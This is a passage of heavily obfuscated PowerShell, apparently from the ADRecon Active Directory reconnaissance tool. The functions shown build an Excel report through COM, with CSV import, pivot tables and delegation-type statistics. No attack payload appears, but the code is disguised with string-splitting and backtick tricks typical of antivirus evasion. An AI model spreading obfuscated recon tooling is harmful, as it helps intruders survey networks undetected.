            ${a`dF`il`eNaMe}  = -join(${A`d`RO`UtpuTDir},'\',("{1}{0}{2}" -f'L-File','HTM','s'),'\',${ADRm`o`duLENa`Me},("{1}{0}" -f 'tml','.h'))
            &("{0}{1}{2}"-f 'Export','-ADRHT','ML') -ADRObj ${A`dr`obj} -ADFileName ${ad`F`iLENaME} -ADROutputDir ${a`drOUTpuTD`IR}
        }
    }
}

Function Get-`Adr`eXcE`LCo`MO`Bj
{


    
    Try
    {
        
        ${SAV`EVE`RbOSEprE`FErE`NcE} = ${scriPt:VEr`B`OSE`P`RE`Fer`e`NCE}
        ${SC`RI`PT`:`V`ERBOsEprEfeR`EnCE} = ("{3}{4}{5}{1}{2}{0}" -f 'ntinue','yC','o','Silen','t','l')
        ${Glo`BAL:exC`eL} = &("{1}{0}{2}" -f 'c','New-Obje','t') -ComObject ("{4}{3}{0}{2}{1}" -f'l','application','.','ce','ex')
        If (${sAVever`BOsE`PrE`F`ErEnCE})
        {
            ${sc`RiPt`:vErb`oSe`p`R`EFEREnce} = ${sa`V`EVerBO`sepREfErEncE}
            &("{4}{3}{1}{2}{0}"-f 'iable','ve','-Var','o','Rem') ("{4}{3}{2}{5}{6}{1}{0}"-f'ce','en','sePre','eVerbo','Sav','fe','r')
        }
    }
    Catch
    {
        If (${saVevErBo`SEprefER`En`Ce})
        {
            ${s`cr`I`PT:`Verb`OSePREFer`enCe} = ${SAVEveRBO`SEP`RE`F`e`ReN`CE}
            &("{2}{0}{3}{1}"-f 'move','Variable','Re','-') ("{0}{5}{1}{4}{2}{3}"-f'S','eVerbos','ref','erence','eP','av')
        }
        &("{1}{3}{0}{2}"-f 'ar','Wr','ning','ite-W') ("{2}{49}{13}{51}{44}{33}{6}{42}{41}{47}{4}{1}{35}{21}{11}{45}{25}{38}{29}{5}{9}{18}{10}{32}{37}{27}{31}{17}{7}{40}{43}{48}{23}{19}{8}{26}{3}{39}{16}{52}{12}{28}{22}{20}{46}{30}{50}{24}{36}{14}{34}{0}{15}"-f 'tall','pe','[G','he ',' ap','ration o','b','e -Ge',' gen','f A','e','e ','epor','R',' Excel in','ed.','co','xlsx. Use th','DR','r to','lx on a','o b','xs','aramete','icrosof','ed','erate t','n','t.','ng gene',' wi','-Report.','c','omO','s','ar t','t','o','. Skippi','ADRe','nExcel','es n','j] Excel do',' ','xcelC','install',' host','ot','p','et-AD','th M','E','n-R')
        &("{3}{2}{1}{0}{4}" -f 'Verbo','te-','i','Wr','se') "[EXCEPTION] $($_.Exception.Message) "
        Return ${nU`LL}
    }
    ${Ex`ceL}."vISI`BLE" = ${t`Rue}
    ${Exc`eL}."IN`TeRAC`TIve" = ${fA`LSe}
    ${G`lob`AL:`wORK`BOOk} = ${E`XcEl}."WOR`KBoo`kS".("{1}{0}" -f 'd','Ad').Invoke()
    If (${w`oRkB`ooK}."Wo`RkSh`Eets"."c`oUNT" -eq 3)
    {
        ${W`o`RkboOK}."w`O`RksheE`TS".("{0}{1}" -f'I','tem').Invoke(3).("{0}{2}{1}" -f 'De','ete','l').Invoke()
        ${w`o`RkbooK}."wOr`ks`HEets".("{0}{1}"-f 'I','tem').Invoke(2).("{0}{1}" -f'D','elete').Invoke()
    }
}

Function GET-adr`E`xCE`Lco`MObjRElEAse
{

    param(
        [Parameter(maNdaToRy = ${Tr`UE})]
        ${Com`O`B`jto`RELEASE},

        [Parameter(mAnDatoRy = ${FA`LsE})]
        [bool] ${fiN`Al} = ${Fa`lSE}
    )
    
    
    If (${Fin`Al})
    {
         (Dir  ('vARIaB'+'L'+'E:Gf1V') ).VAlUE::("{2}{4}{3}{0}{1}" -f's','eComObject','Fina','a','lRele').Invoke(${cOMobJ`TORe`L`Ea`Se}) | &("{1}{0}" -f'ull','Out-N')
    }
    Else
    {
         $GF1v::("{0}{4}{1}{2}{3}"-f'R','m','Obje','ct','eleaseCo').Invoke(${C`OmOB`jtorel`EaSe}) | &("{2}{1}{0}" -f 'l','Nul','Out-')
    }
     $ea9O1::("{0}{2}{1}"-f 'C','llect','o').Invoke()
      (  gEt-VariABlE  ('ea9o'+'1')  ).valUE::("{4}{0}{5}{2}{1}{3}"-f 'itForPendin','e','iz','rs','Wa','gFinal').Invoke()
}

Function gET-a`d`RE`XC`ELWOrkBo`Ok
{

    param (
        [Parameter(mAnDAtORy = ${tR`UE})]
        [string] ${n`Ame}
    )

    ${wOr`k`BOok}."wo`RKsHe`ets".("{1}{0}"-f'dd','A').Invoke() | &("{0}{1}"-f 'Out','-Null')
    ${w`orKSh`e`ET} = ${wORK`BO`ok}."W`oRkShe`eTS".("{0}{1}"-f 'Ite','m').Invoke(1)
    ${woRKS`H`eEt}."n`Ame" = ${nA`mE}

    &("{2}{3}{6}{0}{5}{1}{4}" -f'RExcelComO','Rel','Get-','A','ease','bj','D') -ComObjtoRelease ${WO`Rk`ShEET}
    &("{0}{2}{1}{3}" -f'Remove-Var','a','i','ble') ("{0}{1}" -f 'workshe','et')
}

Function geT-`AdRE`XC`Elimp`OrT
{

    param (
        [Parameter(MaNDaTORy = ${t`RuE})]
        [string] ${a`dF`ILen`AMe},

        [Parameter(mAnDATory = ${fal`se})]
        [int] ${MEth`oD} = 1,

        [Parameter(MaNDaTORy = ${Fa`lSE})]
        [int] ${r`oW} = 1,

        [Parameter(MANDAtorY = ${faL`Se})]
        [int] ${CoL`UMn} = 1
    )

    ${e`x`CEl}."s`CRe`E`Nup`daTIng" = ${F`ALSe}
    If (${M`ETh`od} -eq 1)
    {
        If (&("{2}{0}{1}" -f't-Pat','h','Tes') ${A`DfIL`E`NamE})
        {
            ${W`ORksHe`ET} = ${W`or`kBOOk}."Wo`R`K`ShEets".("{0}{1}"-f'Ite','m').Invoke(1)
            ${T`X`TconN`ECtor} = (("{0}{1}"-f 'TEX','T;') + ${aD`F`ILENAMe})
            ${Ce`llR`EF} = ${w`orKsH`EEt}.("{1}{0}" -f 'nge','Ra').Invoke("A1")
            
            ${C`OnNe`CToR} = ${wORkSh`e`ET}."quErYT`Abl`ES".("{1}{0}" -f 'd','ad').Invoke(${txtCoNne`C`T`OR}, ${CeLLr`Ef})

            
            ${WOrkSH`E`et}."QUe`R`yTa`BlEs".("{0}{1}" -f'i','tem').Invoke(${cO`N`NeCtOR}."NA`ME")."TExT`F`i`lE`P`lATforM" = 65001
            ${w`oR`KSheEt}."QueR`yTa`B`LeS".("{0}{1}" -f'it','em').Invoke(${CoN`Ne`Ctor}."Na`ME")."t`EXTFileCo`mMADElimIT`ER" = ${t`RuE}
            ${W`OrKshE`Et}."QUERyt`A`B`les".("{1}{0}" -f 'm','ite').Invoke(${con`NEcT`OR}."nA`mE")."T`eXT`FilEp`A`RS`etypE" = 1
            ${wOrKSH`e`ET}."Q`UeRYta`B`leS".("{1}{0}" -f'em','it').Invoke(${C`ONNEC`Tor}."Na`Me").("{1}{0}{2}" -f'fres','Re','h').Invoke() | &("{1}{0}"-f '-Null','Out')
            ${W`ORK`She`ET}."QUe`R`YtAbLES".("{1}{0}" -f 'em','it').Invoke(${c`o`NnecTOR}."na`ME").("{1}{0}" -f'elete','d').Invoke()

            &("{0}{3}{4}{1}{2}" -f 'Get-ADRExcel','Relea','se','Co','mObj') -ComObjtoRelease ${celLr`eF}
            &("{2}{0}{1}{3}" -f 'e-V','ariab','Remov','le') ("{2}{0}{1}"-f 'll','Ref','Ce')
            &("{4}{1}{0}{3}{2}"-f 'Rele','RExcelComObj','e','as','Get-AD') -ComObjtoRelease ${CoNN`EC`TOr}
            &("{3}{0}{1}{4}{2}" -f'v','e-','riable','Remo','Va') ("{0}{2}{1}" -f 'Connect','r','o')

            ${LI`StOBj`E`ct} = ${WO`R`KShEet}."l`iSt`oBJ`ECTs"."A`Dd"( $1KW::"xlS`R`cRANGe", ${w`ork`SHe`Et}."use`DraNge", ${n`ULL},   ( LS  ('V'+'ArIABl'+'E:mD5'+'lE') ).valuE::"x`Lyes", ${N`ULL})
            ${LIst`Obj`E`Ct}."tabLes`Ty`LE" = ("{4}{0}{2}{3}{1}"-f'e','ht2','StyleLi','g','Tabl') 
            ${W`or`KsheET}."U`sE`dRANGe"."entI`R`ecOl`UMN".("{0}{1}"-f'Au','toFit').Invoke() | &("{0}{1}" -f 'Ou','t-Null')
        }
        &("{2}{4}{1}{3}{0}"-f'le','a','Re','riab','move-V') ("{3}{1}{2}{0}" -f 'e','DFil','eNam','A')
    }
    Elseif (${met`h`OD} -eq 2)
    {
        ${Wo`RKS`HeET} = ${wO`Rk`BOok}."Wo`R`ksHeets".("{0}{1}"-f 'I','tem').Invoke(1)
        If (&("{2}{1}{0}"-f'-Path','est','T') ${ADFI`l`enAMe})
        {
            ${a`d`TemP} = &("{1}{0}{2}{3}"-f 'rt','Impo','-C','sv') -Path ${ADf`i`l`ename}
            ${a`dtE`mp} | &("{1}{2}{0}"-f 'ject','ForE','ach-Ob') {
                Foreach (${P`Rop} in ${_}."pSoB`jECt"."pRopEr`T`ies")
                {
                    ${w`OrksH`eet}."cE`lls".("{0}{1}" -f 'I','tem').Invoke(${r`OW}, ${C`oL`UmN}) = ${P`RoP}."NA`mE"
                    ${WorkS`h`eEt}."CE`llS".("{1}{0}" -f 'em','It').Invoke(${r`Ow}, ${c`oLuMN} + 1) = ${Pr`Op}."V`AlUE"
                    ${R`Ow}++
                }
            }
            &("{3}{1}{2}{0}" -f'able','ve-Var','i','Remo') ("{1}{0}"-f 'Temp','AD')
            ${liSTo`B`Ject} = ${WoR`Ksh`eEt}."li`ST`objecTs"."A`Dd"( (VARiaBLE 1Kw  -VaL  )::"xL`sRcrAN`GE", ${wOr`K`sheET}."U`s`EdrAnGe", ${N`Ull},  $md5Le::"xl`YeS", ${N`Ull})
            ${L`iSTobje`cT}."t`AblESty`Le" = ("{2}{0}{1}{3}{4}"-f'bleSt','yle','Ta','Lig','ht2') 
            ${uSE`Dran`ge} = ${wo`RKsH`EET}."UsE`DraN`Ge"
            ${Us`e`dranGe}."ent`ireCO`Lu`mn".("{0}{1}"-f 'Auto','Fit').Invoke() | &("{1}{0}{2}"-f '-Nu','Out','ll')
        }
        Else
        {
            ${WO`R`kSheeT}."CEl`Ls".("{0}{1}" -f'I','tem').Invoke(${r`ow}, ${cO`lUmn}) = ("{2}{1}{0}"-f 'or!','r','Er')
        }
        &("{0}{1}{2}{3}"-f 'Re','mo','ve-','Variable') ("{1}{0}{2}" -f 'N','ADFile','ame')
    }
    Elseif (${m`E`THoD} -eq 3)
    {
        ${Wo`RKshe`Et} = ${WORk`BO`OK}."w`OrkshE`ETS".("{0}{1}"-f'I','tem').Invoke(1)
        If (&("{1}{2}{0}" -f 'Path','Test','-') ${a`DFi`lEna`mE})
        {
            ${Cs`VDa`TA} = &("{0}{1}{2}" -f 'Impor','t-C','sv') -Path ${Ad`F`ile`NAMe}

            ${ro`W_O`UTp`UT} = ${R`Ow}
            ${c`sVd`Ata}[0]."P`sObjECT"."P`RoP`eRTIeS"."nA`mE" | &("{1}{0}{2}" -f 'r','Fo','Each') {
                ${W`oR`k`shEET}."CEL`lS".("{0}{1}"-f'I','tem').Invoke(${RoW_`oU`T`put}, ${c`oLU`mN}) = ${_}
                ${RO`w_OUtP`Ut}++
            }
            &("{4}{2}{3}{1}{0}" -f 'le','ariab','em','ove-V','R') ("{2}{0}{1}"-f '_ou','tput','row')

            ${c`oluM`N_`OUt`PUt} = ${C`OLuMN} + 1
            ${cs`VdA`Ta} | &("{3}{2}{1}{4}{0}"-f 'Object','h','rEac','Fo','-') {
                ${R`Ow_`OU`TpUT} = ${r`ow}
                ForEach (${P`Rop_`VAl`UE} in ${_}."pS`Ob`jeCT"."PrO`p`eRt`ieS"."v`ALuE")
                {
                    ${wOrk`Sh`EET}."cEl`Ls".("{0}{1}"-f 'Ite','m').Invoke(${roW_O`U`TpuT}, ${c`OLUm`N`_OU`TpUt}) = ${p`ROp_v`AluE}
                    ${R`ow`_oUTPuT}++
                }
                ${coL`UMN`_ou`T`PUt}++
            }
            &("{4}{0}{3}{2}{1}"-f 'v','able','Vari','e-','Remo') ("{0}{1}{2}{3}" -f 'colu','mn_ou','t','put')
            &("{4}{3}{1}{0}{2}"-f 'ab','Vari','le','-','Remove') ("{2}{0}{1}" -f '_o','utput','row')

            &("{0}{2}{1}" -f'Remove-Vari','le','ab') ("{0}{2}{1}"-f'Cs','Data','v')

            ${l`IStOb`Je`CT} = ${W`orK`shEET}."L`I`STOB`JEcTs"."a`dd"(  ( GeT-VARiaBle  ("1K"+"W")).valUe::"xlSR`CrAn`Ge", ${WOrKSh`e`eT}."useD`RAN`ge", ${NU`ll},   $MD5le::"x`LYEs", ${Nu`Ll})
            ${list`Obj`Ect}."T`ABLeSTY`le" = ("{0}{2}{3}{1}" -f 'Tab','ht2','leStyle','Lig') 
            ${Us`eD`RANgE} = ${w`oR`ksheet}."us`EdrAN`Ge"
            ${US`E`Dr`AnGE}."eNT`IRE`COLuMn".("{2}{1}{0}" -f't','utoFi','A').Invoke() | &("{2}{1}{0}" -f 'll','Nu','Out-')
        }
        Else
        {
            ${w`or`kshEet}."cEL`ls".("{1}{0}" -f'tem','I').Invoke(${r`ow}, ${CO`LumN}) = ("{1}{0}"-f'or!','Err')
        }
        &("{4}{1}{2}{3}{0}"-f 'ble','em','ove-Va','ria','R') ("{2}{1}{0}"-f 'e','ileNam','ADF')

    }
    ${eX`CEl}."S`CReenU`P`DATI`Ng" = ${t`RUE}

    &("{3}{5}{1}{4}{0}{2}"-f'eas','-ADRExce','e','Ge','lComObjRel','t') -ComObjtoRelease ${W`Or`KsHeEt}
    &("{2}{1}{3}{0}"-f'able','ove-','Rem','Vari') ("{0}{1}{2}" -f 'worksh','e','et')
}


Function GET`-ADREXCElP`I`V`otTaBLE
{

    param (
        [Parameter(ManDaTOrY = ${t`RuE})]
        [string] ${sRcShE`etn`AME},

        [Parameter(manDaTOrY = ${tR`Ue})]
        [string] ${PI`VoT`TA`BLEN`AmE},

        [Parameter(MaNDaTORY = ${FA`l`sE})]
        [array] ${p`iVotro`wS},

        [Parameter(MandaTOrY = ${fa`Lse})]
        [array] ${pi`VO`TCOluM`NS},

        [Parameter(MandatORY = ${FA`L`se})]
        [array] ${P`iVO`T`FIL`Ters},

        [Parameter(MaNdAtOry = ${fAL`sE})]
        [array] ${PIV`OT`Va`Lues},

        [Parameter(mAnDATorY = ${fal`se})]
        [array] ${pi`VoTpE`R`c`enTaGE},

        [Parameter(MaNdAtoRY = ${FA`lSe})]
        [string] ${PIv`oT`LOCat`ion} = ("{1}{0}" -f '1C1','R')
    )

    ${eXc`eL}."S`C`ReeNUP`DAtINg" = ${F`Al`SE}
    ${s`R`cwOrKSheet} = ${wORkBO`Ok}."SH`e`ets".("{0}{1}"-f 'Ite','m').Invoke(${SrcS`He`eT`NAME})
    ${W`orKB`OOK}."S`HoWpI`VoTtA`BlEFIEldl`iST" = ${F`A`LSE}

    
    
    
    
    
    

    
    
    ${pIVOTf`Ail`ed} = ${FA`L`se}
    Try
    {
        ${Pi`VoT`c`ACheS} = ${wo`RKB`OOk}.("{3}{0}{1}{2}"-f'tCach','e','s','Pivo').Invoke()."c`Re`ATE"( $L0j8::"Xld`ATa`BASe", ${s`Rcw`orKShE`et}."us`edRaN`ge",   (GET-VaRiaBLE ('y'+'d3L')  ).vAlUe::"xLpiVo`T`TAB`lE`VeRsI`on12")
    }
    Catch
    {
        ${Pi`VotF`AIlED} = ${tr`UE}
        &("{2}{3}{4}{1}{0}" -f'ose','b','Wri','t','e-Ver') ("{6}{3}{0}{2}{1}{5}{4}" -f 'otC','eate] F','aches().Cr','Piv','iled','a','[')
        &("{4}{2}{1}{0}{3}" -f's','o','b','e','Write-Ver') "[EXCEPTION] $($_.Exception.Message) "
    }
    If ( ${Pi`VOTF`Ai`LeD} -eq ${T`RuE} )
    {
        ${Ro`WS} = ${srCWO`Rk`SH`EET}."u`s`Edr`ANge"."rO`Ws"."Cou`NT"
        If (${S`RCs`HE`etnA`ME} -eq ("{0}{1}{2}" -f 'Comput','er S','PNs'))
        {
            ${pIV`O`TcOlS} = ("{1}{0}"-f '1:C','A')
        }
        ElseIf (${Src`SH`eet`NAme} -eq ("{1}{0}{2}"-f 'pu','Com','ters'))
        {
            ${p`IvO`TCOlS} = ("{0}{1}" -f 'A1:','F')
        }
        ElseIf (${SRcSH`E`eTn`AmE} -eq ("{0}{1}" -f'Use','rs'))
        {
            ${PIV`O`TCOLs} = ("{0}{1}"-f 'A1:','C')
        }
        ${Us`EDRAN`ge} = ${S`RCwORK`SHe`ET}.("{0}{1}" -f 'R','ange').Invoke(${pivOTc`o`Ls}+${r`OWs})
        ${pivO`T`CacH`eS} = ${WoR`k`BOoK}.("{3}{0}{1}{2}" -f'i','votC','aches','P').Invoke()."Cr`EAte"(  ( GI  ("VA"+"riaBlE:"+"L0J8")  ).vaLue::"XL`D`A`TabaSE", ${U`SEDra`NGe},  (  Gi  vAriaBlE:yd3l  ).valuE::"xlPiVo`Tt`Ab`lEve`R`sIon12")
        &("{1}{0}{3}{2}" -f 'a','Remove-Vari','e','bl') ("{1}{0}"-f'ows','r')
	    &("{1}{2}{0}{3}"-f'V','Remo','ve-','ariable') ("{0}{1}"-f 'Pi','votCols')
        &("{1}{4}{3}{2}{0}"-f'able','R','ri','Va','emove-') ("{1}{2}{0}" -f 'Range','Use','d')
    }
    &("{1}{0}{3}{2}" -f 've-V','Remo','le','ariab') ("{1}{2}{3}{0}"-f 'd','Pi','votF','aile')
    ${P`IV`Ottab`LE} = ${PI`Vot`cAC`hEs}.("{4}{2}{0}{1}{3}"-f'ePi','votTa','reat','ble','C').Invoke(${p`IvotLoCAt`i`oN},${pi`Vott`AbLe`NAmE})
    

    If (${Pi`VO`TROWs})
    {
        ForEach (${r`OW} in ${pivo`TrO`ws})
        {
            ${pIvo`T`FiElD} = ${PivoT`T`AblE}.("{2}{1}{0}{3}" -f'vot','i','P','Fields').Invoke(${R`Ow})
            ${PIvO`TF`ie`Ld}."ori`e`NtatiON" =  (VAriaBLE YDs47  -vALuEon  )::"xlRo`wFIE`LD"
        }
    }

    If (${piVoTc`O`lUMNs})
    {
        ForEach (${C`Ol} in ${p`ivo`T`Col`UMnS})
        {
            ${p`IV`OtfiELD} = ${pIv`Ottab`LE}.("{2}{0}{1}" -f 'eld','s','PivotFi').Invoke(${C`oL})
            ${PiV`oTf`Ie`ld}."or`iENTa`TIoN" =   (  vARIABLe  ("YDS4"+"7") ).value::"xLc`Olum`N`F`IeLd"
        }
    }

    If (${piV`otF`iL`Te`Rs})
    {
        ForEach (${f`il} in ${PIv`oTFIl`TerS})
        {
            ${P`iV`OtFIeld} = ${pIvo`TTa`B`Le}.("{1}{2}{0}" -f'lds','Pivot','Fie').Invoke(${f`il})
            ${PIv`oTfi`ElD}."o`RiENT`AtIOn" =   (dIr  ('va'+'RIablE:'+'Y'+'d'+'s47') ).vALue::"XL`P`Ag`EFiELD"
        }
    }

    If (${P`IVOTva`Lu`ES})
    {
        ForEach (${v`AL} in ${P`ivot`VAl`Ues})
        {
            ${pI`V`OT`FIeLD} = ${PI`Vott`ABle}.("{3}{2}{1}{0}" -f 'ds','l','votFie','Pi').Invoke(${V`Al})
            ${Pi`V`OTfi`eLD}."ORieNT`A`T`ION" =   $YDS47::"x`lDA`TafiE`Ld"
        }
    }

    If (${Pi`V`O`TperC`ENTAge})
    {
        ForEach (${v`Al} in ${PiVO`TPe`RcENTA`GE})
        {
            ${pIVO`TF`I`Eld} = ${PI`VO`Tt`AblE}.("{2}{1}{0}" -f'ds','iel','PivotF').Invoke(${V`AL})
            ${PIv`OTf`i`eLd}."Or`ienTA`T`ION" =  (VaRiaBle ('Yds4'+'7')  -vaLueoNLY  )::"xl`dAtAfI`ELd"
            ${P`I`VOtFIeLD}."cA`L`cuL`ATiON" =  ( variAbLe 7uwP  -VAluE )::"XlpE`RC`enT`OF`TOtaL"
            ${pivOTTA`B`lE}."shOWv`ALues`ROW" = ${FAL`SE}
        }
    }

    
    ${Ex`C`el}."ScRe`eNUp`dA`TiNg" = ${tR`UE}

    &("{5}{1}{4}{3}{2}{6}{0}" -f'bjRelease','x','C','l','ce','Get-ADRE','omO') -ComObjtoRelease ${PIV`o`TfIe`ld}
    &("{3}{2}{0}{1}" -f'r','iable','a','Remove-V') ("{0}{1}{2}"-f'Pivot','Fie','ld')
    &("{0}{4}{2}{3}{1}" -f'Get-','e','lComO','bjReleas','ADRExce') -ComObjtoRelease ${PivoTt`A`BLE}
    &("{3}{1}{2}{0}" -f 'ble','Var','ia','Remove-') ("{2}{1}{0}"-f'le','Tab','Pivot')
    &("{5}{0}{1}{2}{3}{6}{4}"-f 'AD','RExcelCom','Ob','jRe','se','Get-','lea') -ComObjtoRelease ${pIV`oTcac`h`ES}
    &("{2}{0}{3}{1}"-f'move-V','able','Re','ari') ("{1}{3}{2}{0}" -f'es','PivotC','h','ac')
    &("{3}{6}{5}{7}{1}{2}{4}{0}"-f 'lease','Com','O','Get','bjRe','xc','-ADRE','el') -ComObjtoRelease ${sR`C`WO`RKShE`et}
    &("{2}{1}{0}"-f'iable','move-Var','Re') ("{3}{0}{2}{1}" -f'r','t','cWorkshee','S')
}

Function get-adr`E`x`cE`l`ATtRibuTESt`AtS
{

    param (
        [Parameter(maNDATORY = ${Tr`UE})]
        [string] ${srCsh`E`EtNaME},

        [Parameter(MaNDAtoRY = ${Tr`UE})]
        [string] ${t`itlE1},

        [Parameter(mandaToRY = ${tR`UE})]
        [string] ${pIVOTT`A`BL`EnA`Me},

        [Parameter(MAndATOry = ${Tr`UE})]
        [string] ${p`iVOtR`ows},

        [Parameter(MaNdaTOrY = ${T`RUE})]
        [string] ${pIvO`TVal`UES},

        [Parameter(MandatoRY = ${t`RuE})]
        [string] ${PiV`o`TPErc`E`NtagE},

        [Parameter(mandATOrY = ${tR`Ue})]
        [string] ${TI`Tl`E2},

        [Parameter(ManDAtORY = ${TR`UE})]
        [System.Object] ${OB`Jat`TribuTes}
    )

    ${e`xCeL}."SCREENUP`da`TIng" = ${f`ALSe}
    ${WO`R`k`sheEt} = ${w`OrK`BoOK}."woR`kShe`eTS".("{0}{1}" -f 'Ite','m').Invoke(1)
    ${sr`C`worKSH`eET} = ${WO`R`Kb`Ook}."ShEe`TS".("{1}{0}" -f'em','It').Invoke(${sRC`shEetNa`ME})

    ${R`OW} = 1
    ${cO`lu`mn} = 1
    ${Wor`KSH`eet}."ce`lLs".("{1}{0}" -f 'em','It').Invoke(${R`OW}, ${C`OL`UMn}) = ${tI`T`Le1}
    ${WOrKS`h`e`Et}."c`ELLs".("{1}{0}" -f'tem','I').Invoke(${R`ow},${C`O`LUmn})."St`YlE" = ("{2}{1}{0}" -f'2','ding ','Hea')
    ${W`O`RKsh`EET}."C`EllS".("{0}{1}"-f 'It','em').Invoke(${r`Ow},${COLu`Mn})."HoRizOn`TA`LA`lIGnmE`Nt" = -4108
    ${mERgEc`e`Lls} = ${wOR`Ks`HEET}.("{0}{1}" -f'Ran','ge').Invoke(("{1}{0}"-f':C1','A1'))
    ${merg`E`CEl`ls}.("{1}{0}" -f 't','Selec').Invoke() | &("{0}{1}"-f 'Out-','Null')
    ${m`eRG`EcEllS}."merGec`El`Ls" = ${tR`Ue}
    &("{3}{0}{2}{1}"-f 'mo','ble','ve-Varia','Re') ("{0}{3}{1}{2}" -f 'M','geCe','lls','er')

    &("{6}{2}{4}{3}{5}{1}{0}" -f'ble','votTa','e','ExcelP','t-ADR','i','G') -SrcSheetName ${S`RCsh`Ee`T`NaME} -PivotTableName ${pIv`OT`TaBlE`NAMe} -PivotRows @(${pIVO`TR`OWs}) -PivotValues @(${p`iv`o`TvalUes}) -PivotPercentage @(${P`IV`oTp`ERCeN`Tage}) -PivotLocation ("{1}{0}"-f'C1','R2')
    ${exc`el}."scREe`N`UpDAT`ING" = ${FA`LSe}

    ${R`OW} = 2
    ("{1}{0}"-f 'pe','Ty'),("{1}{0}" -f't','Coun'),("{1}{2}{0}"-f 'age','Percen','t') | &("{0}{1}{2}" -f'ForEach-O','b','ject') {
        ${WoR`K`SHe`Et}."C`ellS".("{1}{0}"-f'm','Ite').Invoke(${r`oW}, ${coLu`MN}) = ${_}
        ${wOr`kS`HEEt}."C`ELLS".("{0}{1}"-f 'It','em').Invoke(${R`oW}, ${coLU`mn})."Fo`Nt"."B`old" = ${tr`UE}
        ${co`Lumn}++
    }

    ${r`oW} = 3
    ${c`OlUMN} = 1
    For(${R`OW} = 3; ${R`OW} -le 6; ${R`ow}++)
    {
        ${te`M`ptext} = [string] ${WO`R`KShe`ET}."cel`Ls".("{0}{1}" -f 'Ite','m').Invoke(${r`oW}, ${C`O`luMN})."TE`Xt"
        switch (${TeMPtE`xT}.("{0}{1}"-f 'To','Upper').Invoke())
        {
            ("{0}{1}" -f 'T','RUE') { ${w`O`RKsHeEt}."Cel`ls".("{1}{0}"-f 'tem','I').Invoke(${r`OW}, ${CoL`UMN}) = ("{2}{1}{0}" -f 'd','le','Enab') }
            ("{1}{0}" -f 'E','FALS') { ${W`OrKs`HEET}."cel`ls".("{1}{0}" -f 'em','It').Invoke(${r`ow}, ${CO`lu`MN}) = ("{0}{1}{2}"-f'D','isable','d') }
            ("{0}{2}{1}{3}" -f 'GR','TOTA','AND ','L') { ${wOrK`sH`E`Et}."Ce`llS".("{0}{1}" -f 'Ite','m').Invoke(${r`oW}, ${CoLu`mn}) = ("{0}{1}"-f'Tot','al') }
        }
    }

    If (${o`Bja`T`TriBUT`Es})
    {
        ${r`Ow} = 1
        ${cO`L`UmN} = 6
        ${WoR`k`SheeT}."cE`LLs".("{1}{0}"-f'm','Ite').Invoke(${r`OW}, ${co`LUmn}) = ${T`I`TLE2}
        ${W`o`RkS`HeEt}."cEL`ls".("{1}{0}" -f 'm','Ite').Invoke(${r`oW},${C`olU`MN})."S`TYle" = ("{0}{2}{1}"-f 'He','g 2','adin')
        ${Wo`Rk`sHEEt}."C`elLs".("{1}{0}" -f'em','It').Invoke(${r`Ow},${c`olumn})."h`O`RizoNtalalig`NmeNT" = -4108
        ${M`ERGeCel`Ls} = ${WoR`K`SHEEt}.("{0}{1}"-f'Ran','ge').Invoke(("{1}{0}" -f 'L1','F1:'))
        ${Me`RGEc`e`LlS}.("{2}{0}{1}" -f'el','ect','S').Invoke() | &("{1}{0}"-f 'ut-Null','O')
        ${Mer`GE`CELLS}."Me`RGeCeL`LS" = ${TR`Ue}
        &("{3}{2}{1}{0}" -f 'le','b','a','Remove-Vari') ("{0}{1}{2}" -f 'MergeC','e','lls')

        ${R`oW}++
        ("{0}{1}"-f 'Catego','ry'),("{3}{1}{0}{2}" -f'd Cou','le','nt','Enab'),("{1}{2}{3}{0}" -f 'ntage','En','abl','ed Perce'),("{0}{2}{3}{1}" -f'Disabl','nt','ed Co','u'),("{0}{2}{1}{3}" -f 'Disabl','ce','ed Per','ntage'),("{0}{2}{1}"-f 'Tota','ount','l C'),("{3}{1}{0}{2}"-f 'ntag','e','e','Total Perc') | &("{1}{0}{3}{2}"-f'E','For','bject','ach-O') {
            ${Works`H`E`ET}."Ce`Lls".("{0}{1}"-f'Ite','m').Invoke(${r`OW}, ${CoL`UMN}) = ${_}
            ${W`orkS`hEeT}."cel`Ls".("{1}{0}"-f 'm','Ite').Invoke(${R`OW}, ${c`O`LUMN})."Fo`NT"."b`Old" = ${t`RuE}
            ${cO`LU`mn}++
        }
        ${EX`ceLCO`lumN} = (${Sr`c`W`OrK`SHEet}."CoL`U`Mns".("{1}{0}"-f'nd','Fi').Invoke(("{1}{2}{0}" -f'd','Enab','le')))
        ${enABl`e`dC`OLA`d`dREsS} = "$($ExcelColumn.Address($false,$false).Substring(0,$ExcelColumn.Address($false,$false).Length-1)):$($ExcelColumn.Address($false,$false).Substring(0,$ExcelColumn.Address($false,$false).Length-1))"
        ${cO`lumn} = 6
        ${i} = 2

        ${Ob`jat`TRib`U`TEs}."KE`yS" | &("{1}{2}{0}" -f 'ect','ForEac','h-Obj') {
            ${exc`eLCo`lUmN} = (${sr`cw`ORKSh`eEt}."col`UMNS".("{1}{0}"-f'nd','Fi').Invoke(${_}))
            ${CoLAd`d`Re`Ss} = "$($ExcelColumn.Address($false,$false).Substring(0,$ExcelColumn.Address($false,$false).Length-1)):$($ExcelColumn.Address($false,$false).Substring(0,$ExcelColumn.Address($false,$false).Length-1))"
            ${r`ow}++
            ${i}++
            If (${_} -eq ("{4}{2}{0}{1}{3}"-f't','ion','a',' Typ','Deleg'))
            {
                ${W`oRk`sHeeT}."cEL`ls".("{0}{1}" -f'It','em').Invoke(${r`ow}, ${c`olUmN}) = ("{4}{5}{0}{3}{2}{1}{6}" -f'a','tio','elega','ined D','Unc','onstr','n')
            }
            ElseIf (${_} -eq ("{1}{4}{3}{0}{2}" -f'n ','Deleg','Type','io','at'))
            {
                ${wO`RKSH`EeT}."CeL`ls".("{0}{1}" -f'Ite','m').Invoke(${r`oW}, ${colU`MN}) = ("{6}{2}{3}{1}{0}{5}{4}"-f'l','d De','tr','aine','gation','e','Cons')
            }
            Else
            {
                ${wORk`shE`eT}."ce`LLs".("{1}{0}"-f'tem','I').Invoke(${R`Ow}, ${CoL`Umn})."FORM`UlA" = "='" + ${sRcw`oRK`s`HEET}."Na`mE" + "'!" + ${ExC`E`LC`OLUmN}.("{0}{2}{1}" -f 'Ad','s','dres').Invoke(${FA`L`se},${FA`l`sE})
            }
